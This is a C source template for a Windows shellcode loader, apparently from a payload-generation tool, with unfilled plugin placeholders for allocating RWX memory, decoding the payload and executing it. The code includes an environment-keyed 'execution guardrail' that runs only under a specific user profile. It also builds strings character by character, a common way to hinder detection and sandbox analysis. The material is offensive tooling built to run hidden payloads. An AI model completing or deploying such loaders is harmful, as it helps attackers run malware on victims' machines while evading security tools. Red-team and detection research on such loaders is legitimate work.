#include <Windows.h>

char *supermega_payload;

int main()
{
	// Execution Guardrail: Env Check
	wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
	wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
	WCHAR buffer[1024];  // NOTE: Do not make it bigger, or we have a __chkstack() dependency!
	DWORD result = ((DWORD(WINAPI*)(LPCWSTR, LPWSTR, DWORD))GetEnvironmentVariableW)(envVarName, buffer, 1024);
	if (result == 0) {
		return 6;
	}
	if (mystrcmp(buffer, tocheck) != 0) { 
		return 6;
	}

	// Allocate RWX segment
    // char *dest = ...
{{ plugin_allocator }}

	// Copy
	// from: supermega_payload[]
	// to:   dest[]
    // len:  0x11223344
{{ plugin_decoder }}

    // Execute *dest
{{ plugin_executor }}

	return 0;
}

int mystrcmp(wchar_t* str1, wchar_t* str2) {
	int i = 0;
	while (str1[i] != L'\0' && str2[i] != L'\0') {
		if (str1[i] != str2[i]) {
			return 1;
		}
		i++;
	}
	return 0;
}